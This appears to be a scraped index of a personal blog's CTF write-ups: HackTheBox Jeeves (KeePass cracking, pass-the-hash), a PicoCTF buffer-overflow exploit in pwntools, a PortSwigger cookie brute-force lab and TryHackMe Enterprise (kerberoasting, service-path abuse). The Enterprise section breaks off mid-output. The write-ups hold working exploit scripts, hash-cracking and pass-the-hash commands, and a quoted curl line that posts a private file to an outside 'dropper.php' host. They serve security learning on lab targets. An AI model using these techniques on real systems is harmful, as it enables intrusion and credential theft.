6bffd098-a112-3610-9833-46c3f87e345a v:1.0 [*] config file parsed [*] config file parsed [*] config file parsed now to mount the share and transfer ceh.kdbx.\nc:\\users\\kohsuke\\documents\u0026gt;net use m: \\\\10.10.14.31\\transfer net use m: \\\\10.10.14.31\\transfer the command completed successfully. c:\\users\\kohsuke\\documents\u0026gt;copy ceh.kdbx m: copy ceh.kdbx m: 1 file(s) copied. next we can extract the keepass password hash and crack it.\n┌──(kali㉿kali)-[/tmp/transfer] └─$ keepass2john ceh.kdbx ceh:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48 ┌──(kali㉿kali)-[/tmp/transfer] └─$ hashcat -a 0 \u0026#39;$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48\u0026#39; /usr/share/wordlists/rockyou.txt -m 13400 we get the password moonshine1. we can now view the contents of ceh.kdbx.\nkpcli:/\u0026gt; ls === groups === ceh/ kpcli:/\u0026gt; cd ceh kpcli:/ceh\u0026gt; ls === groups === email/ general/ homebanking/ internet/ network/ windows/ === entries === 0. backup stuff 1. bank of america www.bankofamerica.com 2. dc recovery pw 3. ec-council www.eccouncil.org/programs/cer 4. it\u0026#39;s a secret localhost:8180/secret.jsp 5. jenkins admin localhost:8080 6. keys to the kingdom 7. walmart.com www.walmart.com kpcli:/ceh\u0026gt; inside the ceh group, we find some entries and more groups. further enumeartion reveals that the other groups are empty, so we can focus our efforts on the entries.\nkpcli:/ceh\u0026gt; ls * === entries === 0. backup stuff 1. bank of america www.bankofamerica.com 2. dc recovery pw 3. ec-council www.eccouncil.org/programs/cer 4. it\u0026#39;s a secret localhost:8180/secret.jsp 5. jenkins admin localhost:8080 6. keys to the kingdom 7. walmart.com www.walmart.com /ceh/email: /ceh/general: /ceh/homebanking: /ceh/internet: /ceh/network: /ceh/windows: there are usernames and password hashes in the entries. i created a user wordlist as well as a password wordlist and sprayed them against jeeves. in retrospect, this was not necessary since most of these users do not exist on the machine, so i could\u0026rsquo;ve narrowed down my users to administrator.\nkpcli:/ceh\u0026gt; show -f 0 title: backup stuff uname: ? pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 url: notes: kpcli:/ceh\u0026gt; show -f 1 title: bank of america uname: michael321 pass: 12345 url: https://www.bankofamerica.com notes: kpcli:/ceh\u0026gt; show -f 2 title: dc recovery pw uname: administrator pass: s1tjatjhksugh9oc4vzl url: notes: kpcli:/ceh\u0026gt; show -f 3 title: ec-council uname: hackerman123 pass: pwndyouall! url: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh notes: personal login kpcli:/ceh\u0026gt; show -f 4 title: it\u0026#39;s a secret uname: admin pass: f7whtrsfdkb6sxhu1cun url: http://localhost:8180/secret.jsp notes: kpcli:/ceh\u0026gt; show -f 5 title: jenkins admin uname: admin pass: url: http://localhost:8080 notes: we don\u0026#39;t even need creds! unhackable! kpcli:/ceh\u0026gt; show -f 6 title: keys to the kingdom uname: bob pass: lceunypjnfiupzszoysa url: notes: kpcli:/ceh\u0026gt; show -f 7 title: walmart.com uname: anonymous pass: password url: http://www.walmart.com notes: getting my shopping on none of the passwords worked, so i tried a pass-the-hash attack using the hash in entry 0 and gained access to the administrator account.\nand with that, jeeves is owned.\n┌──(kali㉿kali)-[/tmp] └─$ impacket-psexec administrator@10.10.10.63 -hashes \u0026#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\u0026#39; impacket v0.12.0.dev1 - copyright 2023 fortra [*] requesting shares on 10.10.10.63..... [*] found writable share admin$ [*] uploading file extswcyv.exe [*] opening svcmanager on 10.10.10.63..... [*] creating service shhj on 10.10.10.63..... [*] starting service shhj..... [!] press help for extra shell commands microsoft windows [version 10.0.10586] (c) 2015 microsoft corporation. all rights reserved. c:\\windows\\system32\u0026gt; ","title":"Jeeves"},{"date":"2024-10-09","image":"","imageAlt":"","link":"http://localhost:1313/posts/pico_buff2/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eBuffer Overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() function, but also to successfully pass the necessary arguments to it.\u003c/p\u003e","tags":["Binary Exploitation","Buffer Overflow","Code Review","PicoCTF","Pwn","x86"],"text":"description buffer overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() function, but also to successfully pass the necessary arguments to it.\nwalkthrough after downloading the vulnerable binary and its source code, the first thing i did was to view the source code.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #define bufsize 100 #define flagsize 64 void win(unsigned int arg1, unsigned int arg2) { char buf[flagsize]; file *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == null) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf,flagsize,f); if (arg1 != 0xcafef00d) return; if (arg2 != 0xf00df00d) return; printf(buf); } void vuln(){ char buf[bufsize]; gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, null, _ionbf, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(\u0026#34;please enter your string: \u0026#34;); vuln(); return 0; } it is apparent that the binary is using the vulnerable gets() function with a buffer size of 100 bytes. we will need to overflow the buffer and call win() as well as pass in two arguments, 0xcafef00d and 0xf00df00d, in order to complete this challenge.\nwe can also see that we need a dummy flag in order for the program to execute correctly.\n┌──(kali㉿kali)-[~/writeups/pico/buff2]\r└─$ echo \u0026#39;pico{debug}\u0026#39; \u0026gt; flag.txt to overflow the buffer, we first need to find the offset of the eip register. eip stands for \u0026ldquo;extended instruction pointer\u0026rdquo; and as its name suggests, points to the next instruction to be executed. we want to write the address of win() to it. to find the address, we can analyze vuln in gdb\u0026hellip;\n┌──(kali㉿kali)-[~/writeups/pico/buff2]\r└─$ gdb vuln \u0026hellip; and find the buffer allocation.\nnotice that the address of offset ebp-0x6c is pushed onto the stack and is read by gets(). this means that after calling the gets function, there will be 108 (0x6c) bytes of buffer between the start of the buffer and the ebp register. note that the 108 bytes allocated differ from the 100-byte buffer declared in vuln.c. discrepancies like this are usually caused by padding or local variables.\nhigh address \u0026hellip; eip (4 bytes) ebp (4 bytes) buffer + padding (108 bytes) \u0026hellip; low address eip is at a higher address immediately after ebp. since ebp is a 4 byte register, eip is 112 (108 + 4) bytes from the start of the buffer. we will therefore need 112 bytes of padding in our payload before eip starts being overwritten.\npreliminary payload: 112 bytes padding + address of win().\n#!/usr/bin/python3 from pwn import * p = process(\u0026#34;./vuln\u0026#34;) elf = elf(\u0026#34;./vuln\u0026#34;) buffer_size = 112 padding = buffer_size * b\u0026#39;a\u0026#39; addr_main = p32(elf.symbols[\u0026#34;main\u0026#34;]) payload_list = [ padding, addr_win ] payload = b\u0026#39;\u0026#39;.join(payload_list) p.sendline(payload) p.interactive() i didn\u0026rsquo;t get a clear indication as to whether my payload succeeded, so i added a breakpoint at the win() function through gdb. if win() is called, the program will pause at the breakpoint.\n#!/usr/bin/python3 from pwn import * p = process(\u0026#34;./vuln\u0026#34;) elf = elf(\u0026#34;./vuln\u0026#34;) buffer_size = 112 padding = buffer_size * b\u0026#39;a\u0026#39; addr_win = p32(elf.symbols[\u0026#34;win\u0026#34;]) payload_list = [ padding, addr_win ] payload = b\u0026#39;\u0026#39;.join(payload_list) with open(\u0026#34;payload\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(payload) g = gdb.attach(p, gdbscript = \u0026#39;\u0026#39;\u0026#39; b *win r \u0026lt; payload \u0026#39;\u0026#39;\u0026#39;) p.sendline(payload) p.interactive() we do break, meaning our exploit successfully called win(). now, we need to add the arguments 0xcafef00d and 0xf00df00d. let us take a look at the stack frame for win().\nhigh address \u0026hellip; arg2 (4 bytes) arg1 (4 bytes) eip (4 bytes) ebp (4 bytes) \u0026hellip; low address unlike x64 binaries, all function arguments in x86 programs are passed directly onto the stack. after jumping to win(), we will also need to overflow eip before we can pass in arg1 and arg2. in my exploit script i set eip to be overflowed with the address of main() for the sake of having a valid return address, but any 4 byte value should work since the flag is being printed directly in win().\n#!/usr/bin/python3 from pwn import * p = process(\u0026#34;./vuln\u0026#34;) elf = elf(\u0026#34;./vuln\u0026#34;) buffer_size = 112 padding = buffer_size * b\u0026#39;a\u0026#39; addr_win = p32(elf.symbols[\u0026#34;win\u0026#34;]) addr_main = p32(elf.symbols[\u0026#34;main\u0026#34;]) arg1 = p32(0xcafef00d) arg2 = p32(0xf00df00d) payload_list = [ padding, addr_win, addr_main, arg1, arg2 ] payload = b\u0026#39;\u0026#39;.join(payload_list) p.sendline(payload) p.interactive() our exploit was successful. now all that\u0026rsquo;s left to do is to change the target from the local binary to the remote pico server.\n#!/usr/bin/python3 from pwn import * p = remote(\u0026#34;saturn.picoctf.net\u0026#34;, 54042) # changed from binary to pico server. elf = elf(\u0026#34;./vuln\u0026#34;) buffer_size = 112 padding = buffer_size * b\u0026#39;a\u0026#39; addr_win = p32(elf.symbols[\u0026#34;win\u0026#34;]) addr_main = p32(elf.symbols[\u0026#34;main\u0026#34;]) arg1 = p32(0xcafef00d) arg2 = p32(0xf00df00d) payload_list = [ padding, addr_win, addr_main, arg1, arg2 ] payload = b\u0026#39;\u0026#39;.join(payload_list) p.sendline(payload) p.interactive() ","title":"PicoCTF: Buffer Overflow 2"},{"date":"2024-09-23","image":"","imageAlt":"","link":"http://localhost:1313/posts/cookie_brute/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eThe \u0026ldquo;Brute-forcing a stay-logged-in cookie\u0026rdquo; lab by PortSwigger features a web application whose stay-logged-in cookies are vulnerable to attack.\u003c/p\u003e","tags":["Broken Authentication","Cookies","PortSwigger","Web Security"],"text":"description the \u0026ldquo;brute-forcing a stay-logged-in cookie\u0026rdquo; lab by portswigger features a web application whose stay-logged-in cookies are vulnerable to attack.\nwalkthrough navigate to the login page under \u0026ldquo;my account\u0026rdquo;. we will first create a stay-logged-in cookie with the user credentials given to us. make sure check \u0026ldquo;stay logged in\u0026rdquo;.\nnow we can copy the cookie to analyze. hit ctr-shift-i to open the developer tools panel and head to the \u0026ldquo;storage\u0026rdquo; section. the value for the \u0026ldquo;stay-logged-on\u0026rdquo; field is our cookie.\nthe cookie is encoded in base64. decoding it reveals that it is composed of the our username, \u0026ldquo;:\u0026rdquo;, and a hash.\n┌──(kali㉿kali)-[/tmp] └─$ echo \u0026#39;d2llbmvyojuxzgmzmgrkyzq3m2q0m2e2mdexztllymjhnmnhnzcw\u0026#39; | base64 -d wiener:51dc30ddc473d43a6011e9ebba6ca770 given that our username was used as part of the cookie, we can reasonably infer that the hash is based on a predictable value like a timestamp, password, or maybe even the username again. in this case, it\u0026rsquo;s the md5 hash of our password. we can confirm this by hashing our password using md5 and verifying it is identical to the hash in our cookie.\n┌──(kali㉿kali)-[/tmp] └─$ echo -n \u0026#39;peter\u0026#39; | md5sum | cut -d \u0026#39; \u0026#39; -f1 51dc30ddc473d43a6011e9ebba6ca770 we have now determined that the stay-logged-in cookie is username:\u0026lt;password md5 hash\u0026gt; and base64-encoded. since we have already been given a list of passwords, we can create a list of potential cookies for carlos by applying these rules. i provided a script that does this and saves the cookies into cookies.txt.\n#!/bin/bash # md5 hash -\u0026gt; user:\u0026lt;hash\u0026gt; -\u0026gt; base64 cookie while read -r line do hash=$(printf \u0026#34;$line\u0026#34; | md5sum | cut -d \u0026#39; \u0026#39; -f1) cookie=$(printf \u0026#34;carlos:$hash\u0026#34; | base64) echo \u0026#34;$cookie\u0026#34; \u0026gt;\u0026gt; cookies.txt done \u0026lt;\u0026lt;\u0026lt; $(cat pass.txt) now we can brute force the stay-logged-in cookie for carlos. logout and start burp suite. we are going to login again as wiener again, but this time we are going to intercept our web requests. forward the post request but capture the get request for your account details.\ncopy it and save it into a file. change the id query string\u0026rsquo;s value to carlos and replace the stay-logged-in cookie with fuzz. now, we can brute force the cookie.\nffuf -request request.txt -request-proto https -mode clusterbomb -w cookies.txt:fuzz -r we see a change in the webserver\u0026rsquo;s response after supplying one of the cookies.\nnow we can simply use our cookie to take over carlos. once again, we open the developer tools and head to storage \u0026gt; cookies. right click and add another item with the name as \u0026ldquo;stay-logged-in\u0026rdquo; and the value as the cookie we got.\nrefresh the page and we are now logged in as carlos.\nbeyond pwn note that finding the cookie for carlos is similar to a password dictionary attack. in this particular though, there is a ip ban for incorrect login attempts. by brute forcing the cookie instead of password, we are able to bypass the ip ban.\nalso worth mentioning is that we can also get the carlos user\u0026rsquo;s password while brute forcing his cookie.\n#!/bin/bash # md5 hash -\u0026gt; user:\u0026lt;hash\u0026gt; -\u0026gt; base64 cookie \u0026amp;\u0026amp; cookie-password map while read -r line do hash=$(printf \u0026#34;$line\u0026#34; | md5sum | cut -d \u0026#39; \u0026#39; -f1) cookie=$(printf \u0026#34;carlos:$hash\u0026#34; | base64) echo \u0026#34;$cookie\u0026#34; \u0026gt;\u0026gt; cookies.txt echo \u0026#34;$cookie: $line\u0026#34; \u0026gt;\u0026gt; map.txt done \u0026lt;\u0026lt;\u0026lt; $(cat pass.txt) once we successfully authenticate with a cookie, we can find its corresponding password through the map.\n┌──(kali㉿kali)-[/tmp] └─$ grep \u0026#39;y2fybg9zomvmnmu2nwvmyze4ogu3zgzmzdczmzvinjq2ytg1ytix\u0026#39; map.txt y2fybg9zomvmnmu2nwvmyze4ogu3zgzmzdczmzvinjq2ytg1ytix: thomas this can be useful when checking for password reuse and may help us access more services in a real engagement.\n","title":"Portswigger Lab: Brute-forcing a stay-logged-in cookie"},{"date":"2024-09-21","image":"","imageAlt":"","link":"http://localhost:1313/about/","summary":"\u003cp\u003eHello and welcome to my blog! Here you will my writeups for some of the CTFs I\u0026rsquo;ve done. I\u0026rsquo;ve started with a few interesting challenges I\u0026rsquo;ve done in the past, but as time goes on, I\u0026rsquo;ll populate this site with writeups for newer CTFs as well.\u003c/p\u003e","tags":[],"text":"hello and welcome to my blog! here you will my writeups for some of the ctfs i\u0026rsquo;ve done. i\u0026rsquo;ve started with a few interesting challenges i\u0026rsquo;ve done in the past, but as time goes on, i\u0026rsquo;ll populate this site with writeups for newer ctfs as well.\nwhoami a bit about myself\u0026hellip; i\u0026rsquo;m a compsci undergrad trying to learn how to properly secure his stuff. i\u0026rsquo;m also oscp-certified and like to spend my free time learning more about security through ctfs, mostly tryhackme and hackthebox in the past, but also expanding onto other platforms like portswigger and pwned labs. if anybody has other recommendations, questions, or would like to connect, here is my linkedin. you can also find some of my projects on github.\n","title":"About"},{"date":"2024-09-17","image":"","imageAlt":"","link":"http://localhost:1313/posts/enterprise/","summary":"\u003cp\u003e\u003cimg src=\"/img/enterprise/enterprise.png#center\" alt=\"Enterprise\"\u003e\u003c/p\u003e\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://tryhackme.com/r/room/enterprise\"\u003eEnterprise\u003c/a\u003e is a Hard difficulty Active Directory box on Tryhackme. We are in an assumed compromise scenario where our only target is a domain controller on the internal network. While privilege escalation was straightforward, there are multiple rabbit holes for initial access.\u003c/p\u003e","tags":["Active Directory","Git","Kerberoast","THM","Unqoted Service Path","Windows"],"text":"\ndescription enterprise is a hard difficulty active directory box on tryhackme. we are in an assumed compromise scenario where our only target is a domain controller on the internal network. while privilege escalation was straightforward, there are multiple rabbit holes for initial access.\nrecon i began my recon on the machine was a nmap scan.\n# nmap 7.94svn scan initiated wed sep 18 17:50:36 2024 as: nmap -p- -a -v -on nmap.scan -t5 10.10.62.141 increasing send delay for 10.10.62.141 from 0 to 5 due to 948 out of 2369 dropped probes since last increase. warning: 10.10.62.141 giving up on port because retransmission cap hit (2). nmap scan report for 10.10.62.141 host is up (0.21s latency). not shown: 65506 closed tcp ports (reset) port state service version 53/tcp open domain simple dns plus 80/tcp open http microsoft iis httpd 10.0 |_http-title: site doesn\u0026#39;t have a title (text/html). |_http-server-header: microsoft-iis/10.0 | http-methods: | supported methods: options trace get head post |_ potentially risky methods: trace 88/tcp open kerberos-sec microsoft windows kerberos (server time: 2024-09-18 18:02:39z) 135/tcp open msrpc microsoft windows rpc 139/tcp open netbios-ssn microsoft windows netbios-ssn 389/tcp open ldap microsoft windows active directory ldap (domain: enterprise.thm0., site: default-first-site-name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http microsoft windows rpc over http 1.0 636/tcp open tcpwrapped 3268/tcp open ldap microsoft windows active directory ldap (domain: enterprise.thm0., site: default-first-site-name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server microsoft terminal services | ssl-cert: subject: commonname=lab-dc.lab.enterprise.thm | issuer: commonname=lab-dc.lab.enterprise.thm | public key type: rsa | public key bits: 2048 | signature algorithm: sha256withrsaencryption | not valid before: 2024-09-17t17:46:46 | not valid after: 2025-03-19t17:46:46 | md5: 12f5:c3db:b128:72f4:9f89:6a26:be7a:899d |_sha-1: 2022:9e18:d0fb:90a4:ba39:9c9b:ef3c:504f:d485:d8ce | rdp-ntlm-info: | target_name: lab-enterprise | netbios_domain_name: lab-enterprise | netbios_computer_name: lab-dc | dns_domain_name: lab.enterprise.thm | dns_computer_name: lab-dc.lab.enterprise.thm | dns_tree_name: enterprise.thm | product_version: 10.0.17763 |_ system_time: 2024-09-18t18:03:41+00:00 |_ssl-date: 2024-09-18t18:03:49+00:00; +50s from scanner time. 5357/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-title: service unavailable |_http-server-header: microsoft-httpapi/2.0 5985/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-title: not found |_http-server-header: microsoft-httpapi/2.0 7990/tcp open http microsoft iis httpd 10.0 |_http-title: log in to continue - log in with atlassian account |_http-server-header: microsoft-iis/10.0 | http-methods: | supported methods: options trace get head post |_ potentially risky methods: trace 9389/tcp open mc-nmf .net message framing 47001/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-server-header: microsoft-httpapi/2.0 |_http-title: not found 49664/tcp open msrpc microsoft windows rpc 49665/tcp open msrpc microsoft windows rpc 49666/tcp open msrpc microsoft windows rpc 49668/tcp open ncacn_http microsoft windows rpc over http 1.0 49669/tcp open msrpc microsoft windows rpc 49670/tcp open msrpc microsoft windows rpc 49672/tcp open msrpc microsoft windows rpc 49674/tcp open msrpc microsoft windows rpc 49703/tcp open msrpc microsoft windows rpc 49707/tcp open msrpc microsoft windows rpc 49840/tcp open msrpc microsoft windows rpc aggressive os guesses: microsoft windows server 2019 (96%), microsoft windows 10 1709 - 1909 (93%), microsoft windows server 2012 (93%), microsoft windows server 2016 (92%), microsoft windows vista sp1 (92%), microsoft windows longhorn (92%), microsoft windows 10 1709 - 1803 (91%), microsoft windows 10 1809 - 2004 (91%), microsoft windows server 2012 r2 (90%), microsoft windows server 2012 r2 update 1 (90%) no exact os matches for host (test conditions non-ideal). network distance: 4 hops tcp sequence prediction: difficulty=260 (good luck!) ip id sequence generation: busy server or unknown class service info: host: lab-dc; os: windows; cpe: cpe:/o:microsoft:windows host script results: | smb2-security-mode: | 3:1:1: |_ message signing enabled and required |_clock-skew: mean: 49s, deviation: 0s, median: 49s | smb2-time: | date: 2024-09-18t18:03:42 |_ start_date: n/a traceroute (using port 554/tcp) hop rtt address 1 75.99 ms 10.13.0.1 2 ... 3 4 204.26 ms 10.10.62.141 read data files from: /usr/bin/../share/nmap os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at wed sep 18 18:03:05 2024 -- 1 ip address (1 host up) scanned in 749.00 seconds even if we were not told that our target was a domain controller (per the room description), it would quickly become apparent with the discovery of dc-specific ports and services like kerberos on port 88.\nafter identifying open services, i always look for quick wins next. i noticed smb anonymous access was allowed and we have read permission on several shares.\n┌──(kali㉿kali)-[~] └─$ netexec smb 10.10.62.141 -u \u0026#39;anonymous\u0026#39; -p \u0026#39;\u0026#39; --shares smb 10.10.62.141 445 lab-dc [*] windows 10 / server 2019 build 17763 x64 (name:lab-dc) (domain:lab.enterprise.thm) (signing:true) (smbv1:false) smb 10.10.62.141 445 lab-dc [+] lab.enterprise.thm\\anonymous: smb 10.10.62.141 445 lab-dc [*] enumerated shares smb 10.10.62.141 445 lab-dc share permissions remark smb 10.10.62.141 445 lab-dc ----- ----------- ------ smb 10.10.62.141 445 lab-dc admin$ remote admin smb 10.10.62.141 445 lab-dc c$ default share smb 10.10.62.141 445 lab-dc docs read smb 10.10.62.141 445 lab-dc ipc$ read remote ipc smb 10.10.62.141 445 lab-dc netlogon logon server share smb 10.10.62.141 445 lab-dc sysvol logon server share smb 10.10.62.141 445 lab-dc users read users share. do not touch! docs and users in particular appeared worth digging further into. i took a look at docs first.\n┌──(kali㉿kali)-[/tmp] └─$ smbclient //10.10.62.141/docs -u anonymous -n try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . d 0 mon mar 15 02:47:35 2021 .. d 0 mon mar 15 02:47:35 2021 rsa-secured-credentials.xlsx a 15360 mon mar 15 02:46:54 2021 rsa-secured-document-pii.docx a 18432 mon mar 15 02:45:24 2021 15587583 blocks of size 4096. 9927627 blocks available smb: \\\u0026gt; there are two files, rsa-secured-credentials.xlsx and rsa-secured-document-pii.docx. these could be huge findings that allow us to breach the domain controller. i transferred the files to my attacker machine. the files were password protected, so i extracted the password hashes with office2john and started cracking them while i continued enumerating the machine (spoiler alert: i couldn\u0026rsquo;t crack any of the hashes).\ni took a look at the users share next. after some digging, i came across a powershell history file for lab_admin in \\lab-admin\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\.\nsmb: \\lab-admin\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\\u0026gt; get consolehost_hisory.txt getting file \\lab-admin\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\consolehost_hisory.txt of size 424 as consolehost_hisory.txt (0.4 kilobytes/sec) (average 0.4 kilobytes/sec) ┌──(kali㉿kali)-[/tmp] └─$ cat consolehost_hisory.txt cd c:\\ mkdir monkey cd monkey cd .. cd .. cd .. cd d: cd d: cd d: d:\\ mkdir temp cd temp echo \u0026#34;replication:101repadmin123!!\u0026#34;\u0026gt;private.txt invoke-webrequest -uri http://1.215.10.99/payment-details.txt more payment-details.txt curl -x post -h \u0026#39;cotent-type: ascii/text\u0026#39; -d .\\private.txt\u0026#39; http://1.215.10.99/dropper.php?file=itsdone.txt del private.txt del payment-details.txt cd .. del temp cd c:\\ c:\\ exit we see the credentials replication:101repadmin123!!. i tried using the credentials. unfortunately, it appears that the replication user has been deleted.\nwe can also brute force usernames by taking advantage of the kdc\u0026rsquo;s prompt for preauthentication for valid usernames (it returns an error if given a nonexistent username). i used kerbrute.\n┌──(kali㉿kali)-[~] └─$ ~/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.62.141 --domain lab.enterprise.thm /usr/share/seclists/usernames/xato-net-10-million-usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ version: dev (9cfb81e) - 09/18/24 - ronnie flathers @ropnop 2024/09/18 17:47:42 \u0026gt; using kdc(s): 2024/09/18 17:47:42 \u0026gt; 10.10.62.141:88 2024/09/18 17:47:47 \u0026gt; [+] valid username: banana@lab.enterprise.thm 2024/09/18 17:47:54 \u0026gt; [+] valid username: guest@lab.enterprise.thm 2024/09/18 17:48:20 \u0026gt; [+] valid username: administrator@lab.enterprise.thm 2024/09/18 17:49:53 \u0026gt; [+] valid username: cake@lab.enterprise.thm 2024/09/18 17:50:51 \u0026gt; [+] valid username: enterprise@lab.enterprise.thm 2024/09/18 17:51:40 \u0026gt; [+] valid username: nik@lab.enterprise.thm 2024/09/18 17:52:34 \u0026gt; [+] valid username: guest@lab.enterprise.thm 2024/09/18 17:52:35 \u0026gt; [+] valid username: administrator@lab.enterprise.thm 2024/09/18 17:57:00 \u0026gt; [+] valid username: banana@lab.enterprise.thm 2024/09/18 17:57:14 \u0026gt; [+] valid username: spooks@lab.enterprise.thm 2024/09/18 17:59:28 \u0026gt; [+] valid username: joiner@lab.enterprise.thm i then tried sprayed 101repadmin123!! against the usernames and variations of it (e.g. 101repadmin123!) against the users to no avail. asreproasting also turned up nothing, so i had to look at other attack vectors.\nthere are also two http services running on ports 80 and 7990 that we can take a look at. while port 80 did not yield anything interesting, there is an atlassian portal on port 7990. the login portal itself appears to be a static and unexploitable webpage, but there is a message mentioning that the org may be moving to github.\ni have to admit, it took me way longer than i would have liked to figure out that there was an actual github page associated with \u0026ldquo;enterprise-thm\u0026rdquo; as opposed to something like a .git folder hidden in a subdirectory.\nthe github page has a single repository that doesn\u0026rsquo;t hold any useful information. however, there is an associated account \u0026ldquo;nik-enterprise-dev\u0026rdquo; which has a repository \u0026ldquo;mgmtscript.ps1\u0026rdquo;. this could prove to be out lucky break.\nfoothold the powershell script takes in a username and password and gets the system information of all computers within an active directory network. while the $username and $userpassword fields are empty, we can see that there has been more than one change pushed to this repository.\nwe can look at the details by cloning the repository.\ngit clone https://github.com/nik-enterprise-dev/mgmtscript.ps1.git i then switched to the repository folder and ran git log. this shows, among others, the commit hash for each push to the repository. we can use these hashes to view changes and previous versions of the repo.\n┌──(kali㉿kali)-[/tmp/mgmtscript.ps1] └─$ git log commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (head -\u0026gt; main, origin/main, origin/head) author: nik-enterprise-dev \u0026lt;80557956+nik-enterprise-dev@users.noreply.github.com\u0026gt; date: sat mar 13 20:09:16 2021 -0500 updated things i accidentally added something commit bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8 author: nik-enterprise-dev \u0026lt;80557956+nik-enterprise-dev@users.noreply.github.com\u0026gt; date: sat mar 13 18:57:40 2021 -0500 create systeminfo.ps1 gets system info from each computer on the domain in one of his commits, nik comments that he \u0026ldquo;accidentally added something\u0026rdquo;. we can view the details by supplying the commit hash.\n┌──(kali㉿kali)-[/tmp/mgmtscript.ps1] └─$ git show c3c239df75fefbe7563d1d29c963ba1f01e4fe5a commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (head -\u0026gt; main, origin/main, origin/head) author: nik-enterprise-dev \u0026lt;80557956+nik-enterprise-dev@users.noreply.github.com\u0026gt; date: sat mar 13 20:09:16 2021 -0500 updated things i accidentally added something diff --git a/systeminfo.ps1 b/systeminfo.ps1 index bc7ca27..5ae7576 100644 --- a/systeminfo.ps1 +++ b/systeminfo.ps1 @@ -1,6 +1,6 @@ import-module activedirectory -$username = \u0026#39;nik\u0026#39; -$userpassword = \u0026#39;\u0026lt;nik\u0026#39;s password\u0026gt;\u0026#39; +$username = \u0026#39;\u0026#39; +$userpassword = \u0026#39;\u0026#39; $pscreds = convertto-securestring $userpassword -asplaintext -force $computers = new-object -typename \u0026#34;system.collections.arraylist\u0026#34; $computer = $(get-adcomputer -filter * | select-object name) we see that nik had accidentally pushed his credentials and the final commit removed them from the repository. i tried nik:\u0026lt;nik's password\u0026gt; against a number of services, but the account does not have sufficient privileges to gain a foothold through common services like rdp or smb. however, since it is a domain account, we can also perform other attacks such as kerberoasting.\n┌──(kali㉿kali)-[/tmp] └─$ impacket-getuserspns lab.enterprise.thm/nik:\u0026#39;\u0026lt;nik\u0026#39;s password\u0026gt;\u0026#39; -dc-ip 10.10.62.141 -request -outputfile kerberoast.txt impacket v0.12.0.dev1 - copyright 2023 fortra serviceprincipalname name memberof passwordlastset lastlogon delegation -------------------- --------- ----------------------------------------------------------- -------------------------- -------------------------- ---------- http/lab-dc bitbucket cn=sensitive-account,cn=builtin,dc=lab,dc=enterprise,dc=thm 2021-03-12 01:20:01.333272 2021-04-26 15:16:41.570158 [-] ccache file is not found. skipping... we get a hash for bitbucket. now to crack it\u0026hellip;\nhashcat -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt eventually, it cracks.\nprivilege escalation with the new credentials for the bitbucket service account, i connected to the domain controller through rdp.\nxfreerdp /v:10.10.62.141 /u:bitbucket /p:\u0026lt;bitbucket\u0026#39;s password\u0026gt; /cert-ignore after some enumeration, i found an unquoted service path.\nc:\\users\\bitbucket\u0026gt;wmic service get name,pathname | findstr /i /v \u0026#34;c:\\windows\\\\\u0026#34; | findstr /i /v \u0026#34;\u0026#34;\u0026#34; name pathname atlassianbitbucket c:\\atlassian\\bitbucket\\7.11.1\\bin\\bserv64.exe //rs//atlassianbitbucket atlassianbitbucketelasticsearch c:\\atlassian\\bitbucket\\7.11.1\\elasticsearch\\bin\\elasticsearch-service-x64.exe //rs//atlassianbitbucketelasticsearch lsm netsetupsvc zerotieroneservice c:\\program files (x86)\\zero tier\\zero tier one\\zerotier one.exe 